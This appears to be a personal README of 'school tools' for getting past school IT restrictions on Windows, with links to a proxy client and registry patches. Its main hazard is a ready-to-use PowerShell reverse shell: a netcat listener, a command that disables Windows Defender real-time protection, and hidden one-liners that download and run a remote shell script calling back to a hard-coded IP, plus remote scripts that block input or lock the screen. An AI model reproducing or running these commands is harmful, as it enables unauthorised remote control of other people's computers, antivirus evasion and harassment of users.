# SchoolTool's

## SchoolTool's - (For People who Hate IT Admins, abusing CIPA by blocking other content) / Windows Only (For Now Atleast)

Disclaimer : 

Many of The Stuff presented here May/May-not work for you, this is more of a personal Page for me to get quick access to links and other stuff. Its adviced not to Use/Follow These unless you know what your doing.

### An idiot who loves to troll people...
### Also someone who loves to bypass restricted content in school.

## [k-proxy](https://kproxy.com/downloads.jsp)

### I use this since my School blocks it...,I just keep it here since its easy for me to download...

### Direct Download (GitHub) -

[Download](https://github.com/OPstriker/k-proxy/raw/56c1920e7dda8c4d18de3910a475221c12b8f363/kproxyagent_windows.zip)

### Chrome Extension -

[Link](https://chrome.google.com/webstore/detail/kproxy-extension/gdocgbfmddcfnlnpmnghmjicjognhonm)

## Registry Files -

### Some Regesitry file's to enable Blocked Stuff on Restricted Computers -

[Download](https://github.com/OPstriker/Regedit-Patches/raw/9138caa88a98c2614286e7fa9d7865706a6d43d8/Registry%20Patches.zip)

## ReverseShell (PowerShell) -

### Listener (Linux Recomended)-
```
sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
```
### Disable Windows Realtime Protection -
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
### Client -
```
powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
```
### Combined Version - 
```
powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
```
### Disable Mouse/Keyboard Input (Cant Seem to Disable TrackPad :/ input)- Change 4 to something Longer if you Wish
```
IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Dis-Input.ps1 -UseBasicParsing); Disable-UserInput -seconds 4 | Out-Null
```
### Working ScreenLock, Locks Your Screen and Prevents user Interaction For a Specific Time (Change 4 to something Else)
```
IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 4
```
This Page May Have Loads of Error's since I suck at english so avoid em pls lol...
